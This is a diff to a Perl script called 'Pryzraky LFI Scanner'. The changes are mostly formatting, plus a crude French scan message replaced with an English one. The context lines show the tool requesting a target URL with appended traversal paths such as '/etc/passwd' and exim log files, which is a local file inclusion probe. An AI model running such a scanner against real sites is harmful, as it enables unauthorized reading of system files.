@@ -10,7 +10,8 @@
 
 use LWP::UserAgent;
 use HTTP::Request;
-system('clear','cls');print "::::::::::::::::::::::::::::::::::::::::::::::::::::::::\n";
+system('clear','cls');
+print "::::::::::::::::::::::::::::::::::::::::::::::::::::::::\n";
 print "::                                                    ::\n";
 print "::               Pryzraky LFI Scanner                 ::\n";
 print "::            [+] Pryzraky LFI Scanner [+]            ::\n";
@@ -23,7 +24,8 @@ $httpd =<STDIN>;
 $host = $link;
 $useragent = LWP::UserAgent->new;
 $resp = $useragent->head($host);
-print $resp->headers_as_string;print "\n>Press enter to execute..\n";
+print $resp->headers_as_string;
+print "\n>Press enter to execute..\n";
 $start =<STDIN>;
 @vuls = ('/etc/passwd',
 '../etc/passwd',
@@ -361,7 +363,7 @@ $start =<STDIN>;
 '/var/log/exim_paniclog',
 '/var/log/exim/paniclog',
 '/var/log/exim/rejectlog',
-'/var/log/exim_rejectlog');print ">Début du scan att fdp[...]\n";
+'/var/log/exim_rejectlog');print ">Starting the scan.. Just wait.\n";
 
 foreach $scan(@vuls){$url = $link.$scan;
 $request = HTTP::Request->new(GET=>$url);
